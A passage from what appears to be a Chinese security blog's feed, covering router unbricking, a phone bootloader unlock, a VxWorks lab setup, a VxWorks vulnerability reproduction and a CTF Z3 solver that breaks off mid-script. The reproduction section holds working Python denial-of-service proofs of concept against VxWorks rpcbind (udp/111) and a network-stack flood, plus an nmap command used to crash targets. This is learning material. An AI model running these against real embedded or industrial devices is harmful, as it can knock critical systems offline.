<p>链接：<a href="https://pan.baidu.com/s/1i55fwJ5DgKUdCPsy1YJsJQ">https://pan.baidu.com/s/1i55fwJ5DgKUdCPsy1YJsJQ</a><br>提取码：gp0q </p>
</blockquote>
<p>选择一个Lan口通过网线与电脑连接，修改IP为192.168.1.X，子网掩码255.255.255.0，网关192.168.1.1，如下图所示：</p>
<p><img src="/posts/d0ae75c3/image-20210406092717204.png" alt="image-20210406092717204"></p>
<p>修改后，电脑会识别到NETGEAR设备，如下图所示：</p>
<p><img src="/posts/d0ae75c3/image-20210406092358915.png" alt="image-20210406092358915"></p>
<p>以管理员权限打开cmd窗口，cd命令切换到Nmrpflash路径下</p>
<p>执行nmrpflash.exe -L查看网卡信息，如下图所示：</p>
<p><img src="/posts/d0ae75c3/image-20210406092925078.png" alt="image-20210406092925078"></p>
<p>选择目标net2（ps：这里我是把WLAN网卡禁用掉了，方便看）</p>
<p>新建一个cmd窗口，执行ping 192.168.1.1 -t</p>
<p><img src="/posts/d0ae75c3/image-20210406093304908.png" alt="image-20210406093304908"></p>
<p>插上电源适配器或者打开电源开关，观察当出现响应的时候（ps：这时会亮起一个红灯），</p>
<img src="/posts/d0ae75c3/image-20210406093609737.png" alt="image-20210406093609737" style="zoom:50%;">

<p>迅速执行nmrpflash.exe -i net2 -a 192.168.1.1 -f R8000-V1.0.4.46_10.1.63.chk</p>
<p><img src="/posts/d0ae75c3/image-20210406093157833.png" alt="image-20210406093157833"></p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Remote finished. Closing connection.</span><br><span class="line">Reboot your device now.</span><br></pre></td></tr></table></figure>

<p>当出现上面两句提示时，说明刷机成功，就可以进入web界面了</p>
<p><img src="/posts/d0ae75c3/image-20210406091620931.png" alt="image-20210406091620931"></p>
<h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><p>Q1：失败了怎么办？</p>
<p>A1：先看看能不能ping通，是不是网线插错了，另外多尝试，时机很重要。</p>
<p>Q2：刷机显示**No response after 60 seconds. Bailing out.**怎么办？</p>
<p>A2：尝试更换固件，尝试-m 指定MAC地址。</p>
<h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p><a href="https://koolshare.cn/thread-80164-1-1.html">R6300V2 nmrpflash 救砖失败</a></p>
<p><a href="https://blog.csdn.net/qq_42882717/article/details/111603959">netgear路由器解包打包变砖过程</a></p>
]]></content>
      <categories>
        <category>小技巧</category>
      </categories>
      <tags>
        <tag>刷机</tag>
        <tag>救砖</tag>
      </tags>
  </entry>
  <entry>
    <title>Nubia Z18 fastboot模式下OEM解锁</title>
    <url>/posts/a9fe26b3.html</url>
    <content><![CDATA[<p>遇到的问题，如下图所示：<br><img src="/posts/a9fe26b3/93A8E1EBFB0BA55C5ABC63DBAA78309E.png" alt="93A8E1EBFB0BA55C5ABC63DBAA78309E.png"></p>
<blockquote>
<p>fastboot oem nubia_unlock NUBIA_NX606J</p>
</blockquote>
<p>感谢大佬Froslass</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>刷机</tag>
        <tag>fastboot</tag>
      </tags>
  </entry>
  <entry>
    <title>VxWorks5.5.1环境搭建</title>
    <url>/posts/16f38465.html</url>
    <content><![CDATA[<p>1、运行“VMware-workstation-full-10.0.0-1295980.exe”开始安装<br>2、点击下一步<br><img src="/posts/16f38465/1592387682525-38fd2d08-729d-40dd-8424-53348811376d.png" alt="image"><br>3、接受许可协议<br><img src="/posts/16f38465/1592387682655-55eb3b46-f95b-4e09-885c-2494d6860727.png" alt="image"><br>4、选择安装类型，典型或者自定义<br><img src="/posts/16f38465/1592387682784-96b2ad0e-676c-4790-bb20-06fdd158b84d.png" alt="image"><br>5、可以点击更改安装功能和安装目录，也可以选择直接选择下一步<br><img src="/posts/16f38465/1592387682914-38c5013d-c478-41b5-ba3c-f0edbf4eac02.png" alt="image"><br>6、配置Sever组件<br><img src="/posts/16f38465/1592387683073-9f5943f0-befb-47c7-99a5-14f37c3f76fd.png" alt="image"><br>7、创建桌面快捷方式<br><img src="/posts/16f38465/1592387683197-0f9c156f-4c61-467c-a92e-f46a742ec897.png" alt="image"><br>8、安装完成后弹出注册界面，可以点击跳过也可以选择输入注册码激活<br><img src="/posts/16f38465/1592387683339-89493136-e9bf-4ca2-8ada-21e586af7c18.png" alt="image"></p>
<ol start="9">
<li>打开VMware，创建新的虚拟机：<br><img src="/posts/16f38465/1592387683465-89e08ac6-2dfb-40ce-b4b9-85c274e894a5.png" alt="image"><br>10.创建典型虚拟机<br><img src="/posts/16f38465/1592387683631-c138191f-1493-4f64-bbbf-00775be0f5d5.png" alt="image"><br>11.使用iso安装，选择下载的vm.iso文件<br><img src="/posts/16f38465/1592387683820-16780f77-08f1-4572-bb51-6f99ae58b572.png" alt="image"><br>12.选择“其他”<br><img src="/posts/16f38465/1592387683977-5d68248e-8cbd-4182-92d2-b457871b60f3.png" alt="image"><br>13.可以进行命名，下一步<br><img src="/posts/16f38465/1592387684100-dc2c01cb-6cb7-4433-8b2b-2e053ea3d6a9.png" alt="image"><br>14.新建虚拟机向导，下一步<br><img src="/posts/16f38465/1592387684227-26675bdd-bb44-40c0-b579-8d18199dbd4f.png" alt="image"><br>15.点击“完成”<br><img src="/posts/16f38465/1592387684358-27b0182f-0480-43c0-bce5-5a93dd0d2c14.png" alt="image"><br>16.运行一下<br><img src="/posts/16f38465/1592387684505-e7ad62a7-b869-4f2e-959e-34bdcfba8c0c.png" alt="image"><br><img src="/posts/16f38465/1592387684633-1a3f484c-32f7-43b4-a86d-9a7b4a548d35.png" alt="image"></li>
</ol>
]]></content>
      <categories>
        <category>工控安全</category>
      </categories>
      <tags>
        <tag>VxWorks</tag>
      </tags>
  </entry>
  <entry>
    <title>VxWorks漏洞复现</title>
    <url>/posts/2f09a2a6.html</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p><strong>关于VxWorks，这里引用44CON议题</strong><a href="http://www.freebuf.com/vuls/78277.html"><strong>《攻击 VxWorks：从石器时代到星际》</strong></a><strong>探究一文章中的介绍：</strong></p>
<blockquote>
<p>VxWorks 是世界上使用最广泛的一种在嵌入式系统中部署的实时操作系统，是由美国WindRiver公司（简称风河公司，即WRS 公司）于1983年设计开发的。其市场范围跨越所有的安全关键领域，仅举几例，包括火星好奇心流浪者、波音787梦幻客机、网络路由器。这些应用程序的安全高危性质使得VxWorks的安全被高度关注。<br>VxWorks操作系统是由美国Wind River(风河公司)开发的一种嵌入式实时操作系统（RTOS），已宣称拥有至少15亿台设备，VxWorks支持几乎所有现代市场上的嵌入式CPU架构，包括x86系列、MIPS、 PowerPC、Freescale ColdFire、Intel i960、SPARC、SH-4、ARM, StrongARM以及xScale CPU。</p>
</blockquote>
<h2 id="0x01-漏洞详情"><a href="#0x01-漏洞详情" class="headerlink" title="0x01 漏洞详情"></a>0x01 漏洞详情</h2><h3 id="网络栈问题"><a href="#网络栈问题" class="headerlink" title="网络栈问题"></a>网络栈问题</h3><h4 id="1、漏洞描述"><a href="#1、漏洞描述" class="headerlink" title="1、漏洞描述"></a>1、漏洞描述</h4><p>部分5.x版本的VxWorks系统在短时间内接受到大量的网络数据包，会造成网络栈崩溃，导致VxWorks无法再与外界主机通信。在部分情况下，终端会给出错误信息，报错信息如下图：<br><img src="/posts/2f09a2a6/1589787832884-ed1c0682-d13d-4c12-87b7-3580fc39909a.png" alt="image.png"><br>但是需要注意的是：有的情况下漏洞触发成功而造成DOS攻击后，VxWorks终端并不会输出下面这串字符提示，但是此时VxWorks的网络栈已经崩溃，已无法再与外界通信，这一点可以通过持续ping来验证。如上错误提示一般会在收到的数据包量非常大的情况下才会出现。</p>
<blockquote>
<p>interrupt: panic: netJobAdd: ring buffer overflow!</p>
</blockquote>
<h4 id="2、验证方式"><a href="#2、验证方式" class="headerlink" title="2、验证方式"></a>2、验证方式</h4><ol>
<li>执行nmap命令（可能需要执行多次） nmap -sU -p110-166 -r -T5 -n 192.168.102.88 ，其中192.168.102.88为运行VxWorks5.5版本的主机IP。</li>
</ol>
<p><img src="/posts/2f09a2a6/1589790127724-3a34350a-5ba3-4938-a242-9d768e4f3901.png" alt="image.png"></p>
<ol start="2">
<li>对tcp&#x2F;21运行的FTP服务连续发送体积极大的FTP请求数据包。</li>
<li>也可用如下Python代码验证该问题：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">hvcost = <span class="string">&quot;192.168.102.88&quot;</span></span><br><span class="line">UDP_PAYLOAD = <span class="string">&#x27;\x72\xfe\x1d\x13\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa0\x00\x01\x97\x7c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc1</span>(<span class="params">host, rpcPort=<span class="number">111</span>, pktNum=<span class="number">6859</span></span>):</span><br><span class="line"> sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> xrange(pktNum):</span><br><span class="line"> 	sock.sendto(UDP_PAYLOAD, (hvcost, <span class="number">111</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc2</span>(<span class="params">host, rpcPort=<span class="number">111</span>, portNum=<span class="number">26</span></span>):</span><br><span class="line"> sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"> <span class="keyword">for</span> port <span class="keyword">in</span> xrange(rpcPort, rpcPort+portNum+<span class="number">1</span>):</span><br><span class="line"> 	sock.sendto(UDP_PAYLOAD, (host, port))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> <span class="keyword">import</span> sys</span><br><span class="line"> poc1(host=sys.argv[<span class="number">0</span>], rpcPort=<span class="number">111</span>, pktNum=<span class="number">100000000</span>)</span><br><span class="line"> <span class="comment">#poc2(host=sys.argv[1], rpcPort=111, portNum=27)</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="rpcbind服务问题"><a href="#rpcbind服务问题" class="headerlink" title="rpcbind服务问题"></a>rpcbind服务问题</h3><h4 id="1、漏洞描述-1"><a href="#1、漏洞描述-1" class="headerlink" title="1、漏洞描述"></a>1、漏洞描述</h4><p>rpcbind服务是SUN-RPC的一部分，在VxWorks系统中该服务监听在tcp&#x2F;111及udp&#x2F;111端口，攻击者向该端口发送经过特殊构造的数据包，可使rpcbind服务崩溃，精心构造的请求可能可以造成任意代码执行，影响5.X和6.X版本。终端会给出错误信息，报错信息如下图：<br><img src="/posts/2f09a2a6/1589790442540-7cbefa09-6d1d-47c6-a0c7-4d08ff5a7df2.png" alt="image.png"></p>
<h4 id="2、验证方式-1"><a href="#2、验证方式-1" class="headerlink" title="2、验证方式"></a>2、验证方式</h4><p>可用如下Python代码验证该漏洞：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">PAYLOAD_HEX = <span class="string">&#x27;cc6ff7e200000000000000020001a086000000040000000488888888000000110000001100001111111111111111111111111111&#x27;</span></span><br><span class="line"><span class="comment">#hvcost = &quot;192.168.102.88&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>(<span class="params">host, rpcPort=<span class="number">111</span></span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    sock.sendto(PAYLOAD_HEX.decode(<span class="string">&#x27;hex&#x27;</span>), (host, rpcPort))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#import sys</span></span><br><span class="line">    poc(host=<span class="string">&quot;192.168.102.88&quot;</span>, rpcPort=<span class="number">111</span>)</span><br></pre></td></tr></table></figure>
<h2 id="0x03-参考资料"><a href="#0x03-参考资料" class="headerlink" title="0x03 参考资料"></a>0x03 参考资料</h2><p><a href="https://www.jianshu.com/p/d156809e0e64">https://www.jianshu.com/p/d156809e0e64</a><br><a href="https://www.freebuf.com/news/93201.html">https://www.freebuf.com/news/93201.html</a></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
        <category>工控安全</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>VxWorks</tag>
      </tags>
  </entry>
  <entry>
    <title>Web渗透测试常见漏洞描述-危害与修复建议</title>
    <url>/posts/3eeae933.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
  <script id="hbeData" type="hbeData" data-hmacdigest="d216a0f7ef20679006e59468c2af6a42c574d109c157c32c0a3f570d00d3da2b"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Web安全</category>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn2020部分题目WP</title>
    <url>/posts/42820316.html</url>
    <content><![CDATA[<p>看了两道题目，简单记录下</p>
<span id="more"></span>

<h2 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h2><p>首先看压缩包名字是Z3，猜测题目考察的是Z3解方程</p>
<p>载入IDA Pro发现果然如此 </p>
<p>输入字符串 带入方程 如果解出来的42个字符与v47这个数组每一位一致就输出“win”</p>
<p>97行下断点 动态调试 就可以拿到这个字符串 </p>
<p><img src="/posts/42820316/image-20200821102357613.png" alt="image-20200821102357613"></p>
<p>最终，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author    :iqiqiya</span></span><br><span class="line"><span class="comment"># @Blog      :iqiqiya.com</span></span><br><span class="line"><span class="comment"># @Time      :2020/8/20</span></span><br><span class="line"><span class="comment"># @FileName  :z3.py</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">v4 = <span class="number">0x4F17</span></span><br><span class="line">v5 = <span class="number">0x9CF6</span></span><br><span class="line">v6 = <span class="number">0x8DDB</span></span><br><span class="line">v7 = <span class="number">0x8EA6</span></span><br><span class="line">v8 =<span class="number">0x6929</span></span><br><span class="line">v9 =<span class="number">0x9911</span></span><br><span class="line">v10 =<span class="number">0x40A2</span></span><br><span class="line">v11 = <span class="number">0x2F3E</span></span><br><span class="line">v12 =<span class="number">0x62B6</span></span><br><span class="line">v13 =<span class="number">0x4B82</span></span><br><span class="line">v14 =<span class="number">0x486C</span></span><br><span class="line">v15 =<span class="number">0x4002</span></span><br><span class="line">v16 =<span class="number">0x52D7</span></span><br><span class="line">v17 =<span class="number">0x2DEF</span></span><br><span class="line">v18 =<span class="number">0x28DC</span></span><br><span class="line">v19 =<span class="number">0x640D</span></span><br><span class="line">v20 = <span class="number">0x528F</span></span><br><span class="line">v21 =<span class="number">0x613B</span></span><br><span class="line">v22 = <span class="number">0x4781</span></span><br><span class="line">v23 =<span class="number">0x6B17</span></span><br><span class="line">v24 = <span class="number">0x3237</span></span><br><span class="line">v25 =<span class="number">0x2A93</span></span><br><span class="line">v26 =<span class="number">0x615F</span></span><br><span class="line">v27 = <span class="number">0x50BE</span></span><br><span class="line">v28 =<span class="number">0x598E</span></span><br><span class="line">v29 =<span class="number">0x4656</span></span><br><span class="line">v30 =<span class="number">0x5B31</span></span><br><span class="line">v31 =<span class="number">0x313A</span></span><br><span class="line">v32 = <span class="number">0x3010</span></span><br><span class="line">v33 =<span class="number">0x67FE</span></span><br><span class="line">v34 =<span class="number">0x4D5F</span></span><br><span class="line">v35 =<span class="number">0x58DB</span></span><br><span class="line">v36 =<span class="number">0x3799</span></span><br><span class="line">v37 =<span class="number">0x60A0</span></span><br><span class="line">v38 =<span class="number">0x2750</span></span><br><span class="line">v39 =<span class="number">0x3759</span></span><br><span class="line">v40 =<span class="number">0x8953</span></span><br><span class="line">v41 =<span class="number">0x7122</span></span><br><span class="line">v42 =<span class="number">0x81F9</span></span><br><span class="line">v43 =<span class="number">0x5524</span></span><br><span class="line">v44 =<span class="number">0x8971</span></span><br><span class="line">v45 =<span class="number">0x3A1D</span></span><br><span class="line">v46 = Int(<span class="string">&#x27;v46&#x27;</span>)</span><br><span class="line">v47 = Int(<span class="string">&#x27;v47&#x27;</span>)</span><br><span class="line">v48 = Int(<span class="string">&#x27;v48&#x27;</span>)</span><br><span class="line">v49 = Int(<span class="string">&#x27;v49&#x27;</span>)</span><br><span class="line">v50 = Int(<span class="string">&#x27;v50&#x27;</span>)</span><br><span class="line">v51 = Int(<span class="string">&#x27;v51&#x27;</span>)</span><br><span class="line">v52 = Int(<span class="string">&#x27;v52&#x27;</span>)</span><br><span class="line">v53 = Int(<span class="string">&#x27;v53&#x27;</span>)</span><br><span class="line">v54 = Int(<span class="string">&#x27;v54&#x27;</span>)</span><br><span class="line">v55 = Int(<span class="string">&#x27;v55&#x27;</span>)</span><br><span class="line">v56 = Int(<span class="string">&#x27;v56&#x27;</span>)</span><br><span class="line">v57 = Int(<span class="string">&#x27;v57&#x27;</span>)</span><br><span class="line">v58 = Int(<span class="string">&#x27;v58&#x27;</span>)</span><br><span class="line">v59 = Int(<span class="string">&#x27;v59&#x27;</span>)</span><br><span class="line">v60 = Int(<span class="string">&#x27;v60&#x27;</span>)</span><br><span class="line">v61 = Int(<span class="string">&#x27;v61&#x27;</span>)</span><br><span class="line">v62 = Int(<span class="string">&#x27;v62&#x27;</span>)</span><br><span class="line">v63 = Int(<span class="string">&#x27;v63&#x27;</span>)</span><br><span class="line">v64 = Int(<span class="string">&#x27;v64&#x27;</span>)</span><br><span class="line">v65 = Int(<span class="string">&#x27;v65&#x27;</span>)</span><br><span class="line">v66 = Int(<span class="string">&#x27;v66&#x27;</span>)</span><br><span class="line">v67 = Int(<span class="string">&#x27;v67&#x27;</span>)</span><br><span class="line">v68 = Int(<span class="string">&#x27;v68&#x27;</span>)</span><br><span class="line">v69 = Int(<span class="string">&#x27;v69&#x27;</span>)</span><br><span class="line">v70 = Int(<span class="string">&#x27;v70&#x27;</span>)</span><br><span class="line">v71 = Int(<span class="string">&#x27;v71&#x27;</span>)</span><br><span class="line">v72 = Int(<span class="string">&#x27;v72&#x27;</span>)</span><br><span class="line">v73 = Int(<span class="string">&#x27;v73&#x27;</span>)</span><br><span class="line">v74 = Int(<span class="string">&#x27;v74&#x27;</span>)</span><br><span class="line">v75 = Int(<span class="string">&#x27;v75&#x27;</span>)</span><br><span class="line">v76 = Int(<span class="string">&#x27;v76&#x27;</span>)</span><br><span class="line">v77 = Int(<span class="string">&#x27;v77&#x27;</span>)</span><br><span class="line">v78 = Int(<span class="string">&#x27;v78&#x27;</span>)</span><br><span class="line">v79 = Int(<span class="string">&#x27;v79&#x27;</span>)</span><br><span class="line">v80 = Int(<span class="string">&#x27;v80&#x27;</span>)</span><br><span class="line">v81 = Int(<span class="string">&#x27;v81&#x27;</span>)</span><br><span class="line">v82 = Int(<span class="string">&#x27;v82&#x27;</span>)</span><br><span class="line">v83 = Int(<span class="string">&#x27;v83&#x27;</span>)</span><br><span class="line">v84 = Int(<span class="string">&#x27;v84&#x27;</span>)</span><br><span class="line">v85 = Int(<span class="string">&#x27;v85&#x27;</span>)</span><br><span class="line">v86 = Int(<span class="string">&#x27;v86&#x27;</span>)</span><br><span class="line">v87 = Int(<span class="string">&#x27;v87&#x27;</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(v4 == <span class="number">34</span> * v49 + <span class="number">12</span> * v46 + <span class="number">53</span> * v47 + <span class="number">6</span> * v48 + <span class="number">58</span> * v50 + <span class="number">36</span> * v51 + v52)</span><br><span class="line">s.add(v5 == <span class="number">27</span> * v50 + <span class="number">73</span> * v49 + <span class="number">12</span> * v48 + <span class="number">83</span> * v46 + <span class="number">85</span> * v47 + <span class="number">96</span> * v51 + <span class="number">52</span> * v52)</span><br><span class="line">s.add(v6 == <span class="number">24</span> * v48 + <span class="number">78</span> * v46 + <span class="number">53</span> * v47 + <span class="number">36</span> * v49 + <span class="number">86</span> * v50 + <span class="number">25</span> * v51 + <span class="number">46</span> * v52)</span><br><span class="line">s.add(v7 == <span class="number">78</span> * v47 + <span class="number">39</span> * v46 + <span class="number">52</span> * v48 + <span class="number">9</span> * v49 + <span class="number">62</span> * v50 + <span class="number">37</span> * v51 + <span class="number">84</span> * v52)</span><br><span class="line">s.add(v8 == <span class="number">48</span> * v50 + <span class="number">14</span> * v48 + <span class="number">23</span> * v46 + <span class="number">6</span> * v47 + <span class="number">74</span> * v49 + <span class="number">12</span> * v51 + <span class="number">83</span> * v52)</span><br><span class="line">s.add(v9 == <span class="number">15</span> * v51 + <span class="number">48</span> * v50 + <span class="number">92</span> * v48 + <span class="number">85</span> * v47 + <span class="number">27</span> * v46 + <span class="number">42</span> * v49 + <span class="number">72</span> * v52)</span><br><span class="line">s.add(v10 == <span class="number">26</span> * v51 + <span class="number">67</span> * v49 + <span class="number">6</span> * v47 + <span class="number">4</span> * v46 + <span class="number">3</span> * v48 + <span class="number">68</span> * v52)</span><br><span class="line">s.add(v11 == <span class="number">34</span> * v56 + <span class="number">12</span> * v53 + <span class="number">53</span> * v54 + <span class="number">6</span> * v55 + <span class="number">58</span> * v57 + <span class="number">36</span> * v58 + v59)</span><br><span class="line">s.add(v12 == <span class="number">27</span> * v57 + <span class="number">73</span> * v56 + <span class="number">12</span> * v55 + <span class="number">83</span> * v53 + <span class="number">85</span> * v54 + <span class="number">96</span> * v58 + <span class="number">52</span> * v59)</span><br><span class="line">s.add(v13 == <span class="number">24</span> * v55 + <span class="number">78</span> * v53 + <span class="number">53</span> * v54 + <span class="number">36</span> * v56 + <span class="number">86</span> * v57 + <span class="number">25</span> * v58 + <span class="number">46</span> * v59)</span><br><span class="line">s.add(v14 == <span class="number">78</span> * v54 + <span class="number">39</span> * v53 + <span class="number">52</span> * v55 + <span class="number">9</span> * v56 + <span class="number">62</span> * v57 + <span class="number">37</span> * v58 + <span class="number">84</span> * v59)</span><br><span class="line">s.add(v15 == <span class="number">48</span> * v57 + <span class="number">14</span> * v55 + <span class="number">23</span> * v53 + <span class="number">6</span> * v54 + <span class="number">74</span> * v56 + <span class="number">12</span> * v58 + <span class="number">83</span> * v59)</span><br><span class="line">s.add(v16 == <span class="number">15</span> * v58 + <span class="number">48</span> * v57 + <span class="number">92</span> * v55 + <span class="number">85</span> * v54 + <span class="number">27</span> * v53 + <span class="number">42</span> * v56 + <span class="number">72</span> * v59)</span><br><span class="line">s.add(v17 == <span class="number">26</span> * v58 + <span class="number">67</span> * v56 + <span class="number">6</span> * v54 + <span class="number">4</span> * v53 + <span class="number">3</span> * v55 + <span class="number">68</span> * v59)</span><br><span class="line">s.add(v18 == <span class="number">34</span> * v63 + <span class="number">12</span> * v60 + <span class="number">53</span> * v61 + <span class="number">6</span> * v62 + <span class="number">58</span> * v64 + <span class="number">36</span> * v65 + v66)</span><br><span class="line">s.add(v19 == <span class="number">27</span> * v64 + <span class="number">73</span> * v63 + <span class="number">12</span> * v62 + <span class="number">83</span> * v60 + <span class="number">85</span> * v61 + <span class="number">96</span> * v65 + <span class="number">52</span> * v66)</span><br><span class="line">s.add(v20 == <span class="number">24</span> * v62 + <span class="number">78</span> * v60 + <span class="number">53</span> * v61 + <span class="number">36</span> * v63 + <span class="number">86</span> * v64 + <span class="number">25</span> * v65 + <span class="number">46</span> * v66)</span><br><span class="line">s.add(v21 == <span class="number">78</span> * v61 + <span class="number">39</span> * v60 + <span class="number">52</span> * v62 + <span class="number">9</span> * v63 + <span class="number">62</span> * v64 + <span class="number">37</span> * v65 + <span class="number">84</span> * v66)</span><br><span class="line">s.add(v22 == <span class="number">48</span> * v64 + <span class="number">14</span> * v62 + <span class="number">23</span> * v60 + <span class="number">6</span> * v61 + <span class="number">74</span> * v63 + <span class="number">12</span> * v65 + <span class="number">83</span> * v66)</span><br><span class="line">s.add(v23 == <span class="number">15</span> * v65 + <span class="number">48</span> * v64 + <span class="number">92</span> * v62 + <span class="number">85</span> * v61 + <span class="number">27</span> * v60 + <span class="number">42</span> * v63 + <span class="number">72</span> * v66)</span><br><span class="line">s.add(v24 == <span class="number">26</span> * v65 + <span class="number">67</span> * v63 + <span class="number">6</span> * v61 + <span class="number">4</span> * v60 + <span class="number">3</span> * v62 + <span class="number">68</span> * v66)</span><br><span class="line">s.add(v25 == <span class="number">34</span> * v70 + <span class="number">12</span> * v67 + <span class="number">53</span> * v68 + <span class="number">6</span> * v69 + <span class="number">58</span> * v71 + <span class="number">36</span> * v72 + v73)</span><br><span class="line">s.add(v26 == <span class="number">27</span> * v71 + <span class="number">73</span> * v70 + <span class="number">12</span> * v69 + <span class="number">83</span> * v67 + <span class="number">85</span> * v68 + <span class="number">96</span> * v72 + <span class="number">52</span> * v73)</span><br><span class="line">s.add(v27 == <span class="number">24</span> * v69 + <span class="number">78</span> * v67 + <span class="number">53</span> * v68 + <span class="number">36</span> * v70 + <span class="number">86</span> * v71 + <span class="number">25</span> * v72 + <span class="number">46</span> * v73)</span><br><span class="line">s.add(v28 == <span class="number">78</span> * v68 + <span class="number">39</span> * v67 + <span class="number">52</span> * v69 + <span class="number">9</span> * v70 + <span class="number">62</span> * v71 + <span class="number">37</span> * v72 + <span class="number">84</span> * v73)</span><br><span class="line">s.add(v29 == <span class="number">48</span> * v71 + <span class="number">14</span> * v69 + <span class="number">23</span> * v67 + <span class="number">6</span> * v68 + <span class="number">74</span> * v70 + <span class="number">12</span> * v72 + <span class="number">83</span> * v73)</span><br><span class="line">s.add(v30 == <span class="number">15</span> * v72 + <span class="number">48</span> * v71 + <span class="number">92</span> * v69 + <span class="number">85</span> * v68 + <span class="number">27</span> * v67 + <span class="number">42</span> * v70 + <span class="number">72</span> * v73)</span><br><span class="line">s.add(v31 == <span class="number">26</span> * v72 + <span class="number">67</span> * v70 + <span class="number">6</span> * v68 + <span class="number">4</span> * v67 + <span class="number">3</span> * v69 + <span class="number">68</span> * v73)</span><br><span class="line">s.add(v32 == <span class="number">34</span> * v77 + <span class="number">12</span> * v74 + <span class="number">53</span> * v75 + <span class="number">6</span> * v76 + <span class="number">58</span> * v78 + <span class="number">36</span> * v79 + v80</span><br><span class="line">s.add(v33 == <span class="number">27</span> * v78 + <span class="number">73</span> * v77 + <span class="number">12</span> * v76 + <span class="number">83</span> * v74 + <span class="number">85</span> * v75 + <span class="number">96</span> * v79 + <span class="number">52</span> * v80)</span><br><span class="line">s.add(v34 == <span class="number">24</span> * v76 + <span class="number">78</span> * v74 + <span class="number">53</span> * v75 + <span class="number">36</span> * v77 + <span class="number">86</span> * v78 + <span class="number">25</span> * v79 + <span class="number">46</span> * v80)</span><br><span class="line">s.add(v35 == <span class="number">78</span> * v75 + <span class="number">39</span> * v74 + <span class="number">52</span> * v76 + <span class="number">9</span> * v77 + <span class="number">62</span> * v78 + <span class="number">37</span> * v79 + <span class="number">84</span> * v80)</span><br><span class="line">s.add(v36 == <span class="number">48</span> * v78 + <span class="number">14</span> * v76 + <span class="number">23</span> * v74 + <span class="number">6</span> * v75 + <span class="number">74</span> * v77 + <span class="number">12</span> * v79 + <span class="number">83</span> * v80)</span><br><span class="line">s.add(v37 == <span class="number">15</span> * v79 + <span class="number">48</span> * v78 + <span class="number">92</span> * v76 + <span class="number">85</span> * v75 + <span class="number">27</span> * v74 + <span class="number">42</span> * v77 + <span class="number">72</span> * v80)</span><br><span class="line">s.add(v38 == <span class="number">26</span> * v79 + <span class="number">67</span> * v77 + <span class="number">6</span> * v75 + <span class="number">4</span> * v74 + <span class="number">3</span> * v76 + <span class="number">68</span> * v80)</span><br><span class="line">s.add(v39 == <span class="number">34</span> * v84 + <span class="number">12</span> * v81 + <span class="number">53</span> * v82 + <span class="number">6</span> * v83 + <span class="number">58</span> * v85 + <span class="number">36</span> * v86 + v87)</span><br><span class="line">s.add(v40 == <span class="number">27</span> * v85 + <span class="number">73</span> * v84 + <span class="number">12</span> * v83 + <span class="number">83</span> * v81 + <span class="number">85</span> * v82 + <span class="number">96</span> * v86 + <span class="number">52</span> * v87)</span><br><span class="line">s.add(v41 == <span class="number">24</span> * v83 + <span class="number">78</span> * v81 + <span class="number">53</span> * v82 + <span class="number">36</span> * v84 + <span class="number">86</span> * v85 + <span class="number">25</span> * v86 + <span class="number">46</span> * v87)</span><br><span class="line">s.add(v42 == <span class="number">78</span> * v82 + <span class="number">39</span> * v81 + <span class="number">52</span> * v83 + <span class="number">9</span> * v84 + <span class="number">62</span> * v85 + <span class="number">37</span> * v86 + <span class="number">84</span> * v87)</span><br><span class="line">s.add(v43 == <span class="number">48</span> * v85 + <span class="number">14</span> * v83 + <span class="number">23</span> * v81 + <span class="number">6</span> * v82 + <span class="number">74</span> * v84 + <span class="number">12</span> * v86 + <span class="number">83</span> * v87)</span><br><span class="line">s.add(v44 == <span class="number">15</span> * v86 + <span class="number">48</span> * v85 + <span class="number">92</span> * 